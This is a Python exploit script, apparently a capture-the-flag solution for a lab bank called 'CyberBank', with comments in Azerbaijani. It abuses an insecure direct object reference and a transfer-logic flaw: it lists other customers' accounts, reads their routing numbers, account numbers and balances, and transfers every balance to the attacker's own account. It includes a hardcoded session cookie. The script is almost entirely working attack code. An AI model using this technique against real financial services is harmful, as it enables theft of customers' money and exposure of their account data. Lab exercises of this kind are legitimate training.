#!/usr/bin/env python3
"""
CyberBank Task 3 — IDOR + Business Logic Exploit
Məntiq: Başqalarının account məlumatlarını (routing, number) transfer_to-ya
        göndərərək onların pullarını öz hesabımıza çəkirik.

Düzgün endpoint ardıcıllığı:
  1. GET /api/customer/info/<user_id>     → accounts_id siyahısı
  2. GET /api/accounts/info/<account_id>  → routing, number, balance
  3. POST /api/accounts/transfer_to/<MY_ACC_ID>  → transfer
"""

import requests
import json

BASE_URL       = "http://web0x06.hbtn"
SESSION_COOKIE = "_nnmEiQsDtGJYPp8TJep4CWTdn95Wu7MdQQ5eqOLeSs.C66-9eglFbLxeOTUrwi5NrrKvQs"

cookies = {"session": SESSION_COOKIE}
headers = {"Content-Type": "application/json"}

# Bizim hesabımız (pulu alacağıq)
MY_ACC_ID = "3fa57d88d8a04f4fb7d0edd1b63ad2d0"

# Kontaktların customer ID-ləri (Task 1-dən)
user_ids = [
    "e6318cf9780d4733b73fecf53347160c",  # Linda Robinson
    "764b4c38d5044d62a9bc74de0aae1c14",  # Robert Martinez
    "d328263ce2bc4c50b948a4ebf25751fd",  # Patricia Garcia
    "d9ddfa6269a3488db4c95678db131db4",  # James Thompson
    "de5991492dfc4c87b101e0071f9c1ab6",  # Elizabeth Martin
    "cb712b450fe2452692a19dd3a1322da3",  # Brian Harris
    "14dc5875c9934ecab4b0f8dfd4974e79",  # Megan White
    "6748f18138004c52a9d52581049a7fcd",  # Mark Jackson
    "ebbbd0405cba43248673002903ea6415",  # Ashley Thomas
    "71b2daddba2c429aa8361d06ca126d8d",  # David Anderson
]

url            = f"{BASE_URL}/api/accounts/transfer_to/{MY_ACC_ID}"
total_transferred = 0

print("=" * 55)
print("  CyberBank Task 3 — IDOR Transfer Exploit")
print("=" * 55)

for uid in user_ids:
    # 1. User profilindən account ID-lərini al
    profile_r = requests.get(
        f"{BASE_URL}/api/customer/info/{uid}",
        cookies=cookies
    )
    if profile_r.status_code != 200:
        print(f"[!] User {uid[:8]}... profil alınmadı: {profile_r.status_code}")
        continue

    profile  = profile_r.json()
    acc_ids  = profile.get("message", {}).get("accounts_id", [])
    username = profile.get("message", {}).get("username", uid[:8])
    print(f"\n[*] {username} → {len(acc_ids)} account")

    for acc_id in acc_ids:
        # 2. Hər account-un tam məlumatını al (routing, number, balance)
        acc_r = requests.get(
            f"{BASE_URL}/api/accounts/info/{acc_id}",
            cookies=cookies
        )
        if acc_r.status_code != 200:
            print(f"  [!] Account {acc_id[:8]}... məlumat alınmadı")
            continue

        acc_data = acc_r.json()
        if "message" not in acc_data:
            print(f"  [!] Account {acc_id[:8]}... 'message' yoxdur")
            continue

        acc     = acc_data["message"]
        balance = acc.get("balance", 0)
        number  = acc.get("number", "")
        routing = acc.get("routing", "")

        print(f"  Account {acc_id[:8]}... | ${balance} | #{number} | routing:{routing}")

        if balance <= 0:
            print(f"  [-] Balans boşdur, keç")
            continue

        # 3. Transfer et — onların routing/number məlumatı ilə
        payload = {
            "raison"    : "Donation",
            "account_id": acc_id,
            "routing"   : routing,
            "number"    : number,
            "amount"    : int(balance),
        }
        res    = requests.post(url, json=payload,
                               cookies=cookies, headers=headers)
        result = res.json()
        status = result.get("status", "?")
        print(f"  → Transfer: {status} | {json.dumps(result)[:80]}")

        if status == "success":
            total_transferred += int(balance)

print(f"\n{'='*55}")
print(f"  Köçürülən cəmi: ${total_transferred}")

# Yekun balans + flag yoxlaması
info = requests.get(
    f"{BASE_URL}/api/customer/info/me",
    cookies=cookies
).json()

bal = info.get("message", {}).get("total_balance", 0)
print(f"  YENİ BALANS   : ${bal}")
print(f"{'='*55}")

if "flag" in json.dumps(info).lower() or bal > 10000:
    print("\n  !!! BAYRAQ TAPILDI !!!")
    print(json.dumps(info, indent=4))
else:
    print(f"\n  Hələ $10,000 keçilməyib (${bal})")
    print("  Tam output-u göndər.")
